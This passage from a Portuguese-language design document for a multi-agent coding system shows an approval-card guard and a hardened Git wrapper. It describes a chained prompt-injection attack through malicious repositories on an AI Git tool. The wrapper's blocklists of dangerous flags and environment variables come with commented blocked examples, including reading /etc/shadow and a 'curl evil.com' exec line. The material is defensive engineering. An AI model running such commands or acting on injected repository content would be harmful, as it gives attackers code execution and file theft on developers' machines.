    // Camada 3: Worktree Hash (Pre-Execution Guard)
    // "O filesystem que o usuário aprovou é o mesmo que será executado?"
    const currentWorktreeHash = computeWorktreeHash(card.worktreePath);
    if (currentWorktreeHash !== card.worktreeHash) {
      return {
        ok: false,
        reason: 'WORKTREE_DIVERGED',
        detail: `Worktree state changed since card was issued. ` +
                `Card hash: ${card.worktreeHash.substring(0, 8)}... ` +
                `Current hash: ${currentWorktreeHash.substring(0, 8)}... ` +
                `A fresh proposal is required.`,
      };
    }

    // Camada 4: OCC atomic check + update (dentro de transação SQLite)
    // Previne time-of-check/time-of-use via atomicidade da transação
    const result = this.db.transaction((): GateResult => {
      const resource = this.db.prepare(
        `SELECT * FROM agent_resources WHERE id = ?`
      ).get(card.agentId) as AgentResource | undefined;

      if (!resource) return { ok: false, reason: 'RESOURCE_NOT_FOUND', detail: `Agent ${card.agentId} not found` };

      // OCC version check: divergiu desde a emissão do card?
      if (resource.currentVersion !== card.resourceVersion) {
        return {
          ok: false,
          reason: 'VERSION_CONFLICT',
          detail: `Stale approval: card issued at v${card.resourceVersion}, resource now at v${resource.currentVersion}. Resource was modified while server was down.`,
        };
      }

      // Tudo validado → aplicar ação e incrementar epoch
      const changes = this.db.prepare(`
        UPDATE agent_resources
        SET    state          = ?,
               currentVersion = currentVersion + 1,
               lastModifiedAt = ?
        WHERE  id = ? AND currentVersion = ?
      `).run(card.proposedAction, Date.now(), card.agentId, card.resourceVersion);

      // Double-check de race condition
      if (changes.changes === 0) {
        return { ok: false, reason: 'RACE_CONDITION', detail: 'Concurrent update at commit time. Retry with fresh card.' };
      }

      return { ok: true, newVersion: resource.currentVersion + 1, message: 'Approval applied successfully.' };
    })();

    return result;
  }
}
```

---

## 📌 MÓDULO 4 — Secure Git Wrapper: Sanitização Completa de Argumentos

### 4.1 — O CVE Real e a Cadeia de Ataque

A ameaça é documentada e real: pesquisadores identificaram três vulnerabilidades distintas (CVE-2025-68143, CVE-2025-68144, CVE-2025-68145) na implementação de referência da Anthropic, mcp-server-git. Ao encadear essas falhas, um atacante pode alcançar RCE completo na máquina do desenvolvedor simplesmente pedindo à IA para resumir um repositório malicioso. Este ataque "Zero-Click" destaca a fragilidade das salvaguardas de uso de ferramentas quando enfrenta prompt injection indireto.

O exploit encadeia uma falha de path traversal para contornar allowlists, um comando `git_init` irrestrito para criar repositórios em locais arbitrários, e **argument injection em git_diff para executar comandos shell**. Essencialmente, a IA é enganada para modificar seu próprio ambiente — escrevendo configurações Git maliciosas — sob o pretexto de executar tarefas padrão de controle de versão.

### 4.2 — Taxonomia Completa de Flags Perigosas

Path traversal ocorre quando input do usuário é usado para construir caminhos de arquivo sem sanitização adequada. Isso permite usar sequências `../` para "atravessar" diretórios e escapar do escopo de caminho pretendido. Ao fazer isso, é possível alcançar arquivos que estão fora do diretório permitido — incluindo arquivos de configuração sensíveis, credenciais e código-fonte da aplicação.

A defesa canônica da OWASP: validar o input do usuário aceitando apenas o que é conhecido como bom — não sanitizar os dados. Usar chrooted jails e políticas de acesso de código para restringir onde os arquivos podem ser obtidos ou salvos. Se forçado a usar input do usuário para operações de filesystem, normalizar o input antes de usar nas file IO APIs.

### 4.3 — Implementação: Secure Git Wrapper v2.3

```typescript
// ============================================================
// secure-git-wrapper.ts — v2.3
// CONTRATO: Wrapper seguro para execução de Git em ambientes multi-agente
//
// DEFESAS IMPLEMENTADAS (em profundidade):
//   1. Allowlist positiva de subcomandos
//   2. Allowlist positiva de flags por subcomando
//   3. Blocklist explícita de flags perigosas (CVE-2025-68143/68144/68145)
//   4. Confinamento de path ao worktree via realpath()
//   5. spawn com shell: false (zero shell injection)
//   6. Sanitização de variáveis de ambiente perigosas
//   7. Timeout máximo por operação
// ============================================================
import { realpath } from 'fs/promises';
import path from 'path';
import { execa } from 'execa';
import { z } from 'zod';

// --- TAXONOMIA COMPLETA DE FLAGS PERIGOSAS ---
//
// Baseado em análise de CVE-2025-68143/68144/68145 +
// documentação do git manual + audit de repositórios de segurança
//
// git diff flags perigosas:
//   --no-index        → Compara arquivos FORA do repositório (LFI clássico)
//   --output=<file>   → Escreve diff em arquivo arbitrário (CVE-2025-68144)
//   --ext-diff        → Executa programa externo como diff handler (RCE)
//   --textconv        → Executa filtro de conversão externo (RCE)
//   --word-diff-regex → Pode causar ReDoS em inputs maliciosos
//   --(no-)renames    → Pode expor caminhos fora do repo em renomeações
//
// git apply flags perigosas:
//   --directory=<root>→ Aplica patch fora do CWD (path traversal)
//   -p<n>             → Strip prefix — pode reescrever caminhos absolutos
//   --unsafe-paths    → Explicitamente desabilita verificações de caminho seguro
//   --allow-overlap   → Pode sobrescrever arquivos fora do worktree
//   --index           → Modifica o índice Git de forma que pode divergir do FS
//
// git log flags perigosas:
//   --format com %d, %T → Pode executar programas externos em alguns setups
//   --exec <cmd>      → Execução direta de comandos
//
// Flags perigosas transversais (qualquer subcomando):
//   --(no-)gitdir-info → Expõe paths internos do git
//   --absolute-git-dir → Retorna caminho absoluto do .git (reconhecimento)
//   --git-dir=<path>  → Redireciona qual .git é usado (sandbox escape)
//   --work-tree=<path>→ Redireciona worktree (sandbox escape)
//   --exec-path=<path>→ Redireciona onde git busca executáveis (RCE)

const UNIVERSAL_FORBIDDEN_FLAGS = new Set([
  '--exec-path',
  '--git-dir',
  '--work-tree',
  '--absolute-git-dir',
  '--no-replace-objects',
  '--super-prefix',
  '--upload-pack',
  '--receive-pack',
]);

type SubcommandPolicy = {
  allowedFlags:   readonly string[];
  allowPathArgs:  boolean;
  forbiddenFlags: readonly string[];
  maxArgs:        number;
  description:    string;
};

const GIT_ALLOWLIST: Record<string, SubcommandPolicy> = {
  'stash': {
    allowedFlags:   ['push', 'pop', 'list', 'show', '--include-untracked', '-m', 'drop'],
    allowPathArgs:  false,
    forbiddenFlags: [],
    maxArgs:        4,
    description:    'Stash operations for checkpoint',
  },
  'diff': {
    allowedFlags:   ['--stat', '--name-only', '--cached', '--name-status', '--shortstat'],
    allowPathArgs:  true,
    forbiddenFlags: [
      '--no-index',      // LFI: compara arquivos fora do repo
      '--output',        // CVE-2025-68144: escrita arbitrária
      '--ext-diff',      // RCE: executa diff handler externo
      '--no-ext-diff',
      '--textconv',      // RCE: executa filtro externo
      '--word-diff-regex',
    ],
    maxArgs:        5,
    description:    'Show changes between commits/working tree',
  },
  'log': {
    allowedFlags:   ['--oneline', '--graph', '--decorate', '-n', '--format'],
    allowPathArgs:  false,
    forbiddenFlags: ['--exec', '--run-command', '--format=%x00'], // null byte injection
    maxArgs:        6,
    description:    'Show commit logs',
  },
  'status': {
    allowedFlags:   ['-s', '--short', '--porcelain', '--branch'],
    allowPathArgs:  false,
    forbiddenFlags: [],
    maxArgs:        3,
    description:    'Show working tree status',
  },
  'show': {
    allowedFlags:   ['--stat', '--name-only', '--format'],
    allowPathArgs:  false,
    forbiddenFlags: ['--no-index', '--output'],
    maxArgs:        3,
    description:    'Show various types of objects',
  },
  'rev-parse': {
    allowedFlags:   ['--short', '--verify', 'HEAD', '--show-toplevel'],
    allowPathArgs:  false,
    forbiddenFlags: ['--absolute-git-dir', '--git-dir'],
    maxArgs:        2,
    description:    'Pick out and massage parameters',
  },
};

// Schema Zod para validação de input na borda
const SecureGitInputSchema = z.object({
  worktreePath: z.string().min(1).max(512),
  subcommand:   z.string().refine(s => s in GIT_ALLOWLIST, {
    message: `Subcommand not in allowlist. Allowed: ${Object.keys(GIT_ALLOWLIST).join(', ')}`,
  }),
  args:         z.array(z.string().max(256)).max(10),
});

export type SecureGitInput  = z.infer<typeof SecureGitInputSchema>;
export interface SecureGitResult { stdout: string; exitCode: number }

// Variáveis de ambiente que podem ser usadas para weaponizar git
// mesmo com allowlist de subcomandos perfeita
const DANGEROUS_ENV_VARS = [
  'GIT_EXEC_PATH',     // Redireciona onde git busca subcomandos (RCE)
  'GIT_PAGER',         // Executa pager arbitrário (RCE)
  'PAGER',             // Fallback do git para pager (RCE via git log)
  'GIT_EDITOR',        // Executa editor arbitrário
  'GIT_SSH',           // Substitui SSH client
  'GIT_SSH_COMMAND',   // Executa comando SSH arbitrário (RCE)
  'GIT_PROXY_COMMAND', // Proxy para conexões de rede
  'GIT_ASKPASS',       // Executa programa para obter credenciais
  'GIT_CONFIG_COUNT',  // Injeta configurações arbitrárias do git
  'GIT_TERMINAL_PROMPT', // Pode vazar informação de autenticação
  'GIT_TRACE',         // Pode escrever logs em arquivos arbitrários
  'GIT_TRACE2',        // Idem
];

/**
 * CONTRATO: secureGit()
 * - INPUT:  SecureGitInput (subcommand + args + worktreePath)
 * - OUTPUT: SecureGitResult | throws SecurityError
 *
 * FLUXO DE SANITIZAÇÃO:
 *   0. Validação de schema Zod
 *   1. Lookup da policy do subcomando na allowlist
 *   2. Para cada argumento:
 *      a. Se começa com '-': é flag
 *         → Verificar flags universalmente proibidas
 *         → Verificar flags proibidas do subcomando
 *         → Verificar flag na allowlist positiva
 *      b. Se não começa com '-': é path argument
 *         → Verificar se policy permite path args
 *         → Resolver realpath() (dereference symlinks)
 *         → Verificar confinamento ao worktree (startsWith check)
 *   3. Sanitizar environment vars perigosas
 *   4. Executar via execa() com shell: false (padrão)
 */
export async function secureGit(input: SecureGitInput): Promise<SecureGitResult> {
  // Camada 0: Schema validation
  const parsed = SecureGitInputSchema.safeParse(input);
  if (!parsed.success) throw new Error(`[SECURITY] ${parsed.error.message}`);

  const { worktreePath, subcommand, args } = parsed.data;
  const policy = GIT_ALLOWLIST[subcommand]!;

  // Resolver worktree real (dereference symlinks para prevenir bypass)
  const resolvedWorktree = await realpath(worktreePath).catch(() => {
    throw new Error(`[SECURITY] Cannot resolve worktree path: ${worktreePath}`);
  });

  // Limite de argumentos
  if (args.length > policy.maxArgs) {
    throw new Error(`[SECURITY] Too many args (${args.length} > ${policy.maxArgs}) for 'git ${subcommand}'`);
  }

  const safeFlags:    string[] = [];
  const safePathArgs: string[] = [];

  for (const arg of args) {
    if (arg.startsWith('-')) {
      const baseFlag = arg.split('=')[0]!;

      // Verificação 1: Flags universalmente proibidas
      if (UNIVERSAL_FORBIDDEN_FLAGS.has(baseFlag)) {
        throw new Error(
          `[SECURITY] Flag '${arg}' is universally forbidden (git sandbox escape vector).`
        );
      }

      // Verificação 2: Flags proibidas do subcomando
      if (policy.forbiddenFlags.includes(baseFlag) || policy.forbiddenFlags.includes(arg)) {
        throw new Error(
          `[SECURITY] Flag '${arg}' is forbidden for 'git ${subcommand}'. ` +
          `CVE-2025-68143/68144 vector blocked.`
        );
      }

      // Verificação 3: Allowlist positiva
      if (!policy.allowedFlags.includes(baseFlag)) {
        throw new Error(
          `[SECURITY] Flag '${baseFlag}' is not in the allowlist for 'git ${subcommand}'. ` +
          `Allowed: ${policy.allowedFlags.join(', ')}`
        );
      }

      safeFlags.push(arg);
    } else {
      // É um path argument
      if (!policy.allowPathArgs) {
        throw new Error(`[SECURITY] Path arguments are not permitted for 'git ${subcommand}'.`);
      }

      // Confinamento ao worktree: resolver e verificar prefixo
      const resolvedArg = await realpath(path.resolve(resolvedWorktree, arg)).catch(() => {
        throw new Error(`[SECURITY] Cannot resolve path arg '${arg}' within worktree.`);
      });

      const worktreePrefix = resolvedWorktree.endsWith(path.sep)
        ? resolvedWorktree
        : resolvedWorktree + path.sep;

      if (resolvedArg !== resolvedWorktree && !resolvedArg.startsWith(worktreePrefix)) {
        throw new Error(
          `[SECURITY] Path traversal blocked: '${resolvedArg}' is outside ` +
          `worktree '${resolvedWorktree}'.`
        );
      }

      safePathArgs.push(resolvedArg); // Usa o path RESOLVIDO, não o input do agente
    }
  }

  // Sanitizar environment
  const sanitizedEnv = { ...process.env };
  for (const envVar of DANGEROUS_ENV_VARS) delete sanitizedEnv[envVar];

  // Executar com execa (shell: false é o padrão — sem injection)
  const result = await execa(
    'git',
    ['-C', resolvedWorktree, subcommand, ...safeFlags, ...safePathArgs],
    {
      env:     sanitizedEnv,
      timeout: 30_000,
      reject:  false,
    }
  );

  if (result.exitCode !== 0) {
    throw new Error(`[GIT ERROR] git ${subcommand} exited ${result.exitCode}: ${result.stderr}`);
  }

  return { stdout: result.stdout, exitCode: result.exitCode };
}

// --- Exemplos de uso e bloqueios documentados ---
//
// ✅ PERMITIDO:
//   secureGit({ worktreePath: '/sandbox/a1', subcommand: 'diff', args: ['--name-only'] })
//   secureGit({ worktreePath: '/sandbox/a1', subcommand: 'stash', args: ['push', '-m', 'cp'] })
//   secureGit({ worktreePath: '/sandbox/a1', subcommand: 'status', args: ['-s'] })
//
// 🚫 BLOQUEADO:
//   secureGit({ ..., subcommand: 'diff', args: ['--no-index', '/etc/passwd'] })
//   → [SECURITY] Flag '--no-index' is forbidden (CVE-2025-68144 vector)
//
//   secureGit({ ..., subcommand: 'diff', args: ['--output=/tmp/exfil.sh'] })
//   → [SECURITY] Flag '--output' is forbidden
//
//   secureGit({ ..., subcommand: 'diff', args: ['../../etc/shadow'] })
//   → [SECURITY] Path traversal blocked
//
//   secureGit({ ..., subcommand: 'log', args: ['--exec', 'bash -c "curl evil.com"'] })
//   → [SECURITY] Flag '--exec' is not in the allowlist
```

---

## 📊 Dossiê de Contratos — Tabela de Referência para NotebookLM

| Módulo | Função Principal | Pré-condição | Pós-condição | Sobrevive a SIGKILL? |
|---|---|---|---|---|
| `bootReconciler()` | Resolve todos os intents WAL pendentes | DB aberto, WAL_DIR acessível | Sistema em estado consistente | ✅ É a resposta ao crash |
| `beginCheckpoint()` | Fase 0: Escreve intent antes de tudo | Nenhuma | Intent em `INTENT_WRITTEN` no disco | ✅ (nada foi feito ainda) |
| `executeGitPhase()` | Fase 1: git stash + atualiza WAL | Intent em `INTENT_WRITTEN` | Intent em `GIT_STASH_DONE` | ✅ Recovery re-drives DB |
| `executeDBPhase()` | Fase 2: Atualiza SQLite + limpa WAL | Intent em `GIT_STASH_DONE` | Intent deletado, DB atualizado | ✅ Idempotente |
| `CPGLoopDetector.detectLoop()` | Detecta loop semântico por CPG+Oracle | Worktree Git acessível | `LoopDiagnosis` ou `NoLoop` | N/A |
| `PreExecutionGuard.issueCard()` | Emite Approval Card com epoch snapshots | Agente no DB, worktree acessível | Card com `resourceVersion` + `worktreeHash` | N/A |
| `PreExecutionGuard.submitApproval()` | Valida e aplica aprovação do usuário | Card HMAC válido | Ação aplicada ou erro tipado | N/A (transação atômica) |
| `secureGit()` | Executa git com sanitização completa | Subcomando na allowlist | Stdout limpo ou SecurityError | N/A (defesa em tempo de execução) |

---

## 🔑 Notas Finais para Integração no NotebookLM

**Dependências entre módulos (ordem de inicialização obrigatória):**
```
1. db = new Database(...)  +  db.pragma('journal_mode = WAL')
2. bootReconciler(db)       ← DEVE ser o primeiro no servidor
3. PreExecutionGuard(db)    ← Usa o mesmo db
4. CPGLoopDetector()        ← Independente, stateful por agente
5. secureGit()              ← Puro, sem estado
```

**Variáveis de ambiente obrigatórias em produção:**
```env
GREENFORGE_GATE_SECRET=<random-256-bit-hex>   # Para HMAC dos Approval Cards
```

**Bibliotecas NPM (instalar via `pnpm`):**
```bash
pnpm add better-sqlite3 execa zod atomically
pnpm add -D @types/better-sqlite3
```